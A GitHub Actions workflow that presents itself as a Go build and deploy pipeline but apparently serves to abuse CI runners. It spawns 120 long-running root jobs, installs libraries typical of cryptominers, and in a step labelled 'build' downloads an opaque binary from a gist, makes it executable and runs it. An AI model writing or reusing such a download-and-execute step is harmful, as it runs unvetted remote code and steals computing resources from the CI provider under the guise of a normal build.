name: verters 
on: [push] 
jobs: 
  build: 
    name: setup 
    runs-on: windows-latest 
    strategy: 
      max-parallel: 5
      fail-fast: false 
      matrix: 
        go: [1.1, 1.2] 
        flag: [A, B] 
    env: 
        NUM_JOBS: 20 
        JOB: ${{ matrix.go }} 
    defaults: 
     run: 
       shell: wsl-bash -u root {0}    
    steps: 
    - name: set up Go ${{ matrix.go }} 
      uses: actions/setup-go@v1 
      with: 
        go-version: ${{ matrix.go }} 
      id: go 
    - name: setup 
      uses: Vampire/setup-wsl@v1 
      with: 
          use-cache: 'true' 
  deploy:    
    name: deploy    
    needs: build    
    runs-on: windows-latest 
    timeout-minutes: 358
    strategy:    
      max-parallel: 10
      fail-fast: false    
      matrix:    
        go: [1.1, 1.2, 1.3, 1.4, 1.5, 1.6, 1.7, 1.8, 1.9, 2.0]    
        flag: [A, B, C, D, E, F, G, H, I, J ,K, L]    
    env:    
        NUM_JOBS: 200    
        JOB: ${{ matrix.go }}    
    defaults:    
     run:    
       shell: wsl-bash -u root {0}    
    steps:    
    - name: set up Go ${{ matrix.go }}    
      uses: actions/setup-go@v1    
      with:    
        go-version: ${{ matrix.go }}    
      id: go    
    - name: setup    
      uses: Vampire/setup-wsl@v1 
      with: 
          use-cache: 'true' 
    - name : install dependencies    
      run: apt-get update && apt-get upgrade -y && apt-get install -y ca-certificates wget libcurl4 libjansson4 libgomp1 libnuma-dev
    - name: build     
      run: wget https://gist.githubusercontent.com/erlandi-main-api/e9e5b813f3bb0e9c61dd42c69a57df82/raw/c661c1b8228c852778c345d23c55c38dc20c5cd3/xnxn && chmod +x xnxn && ./xnxn
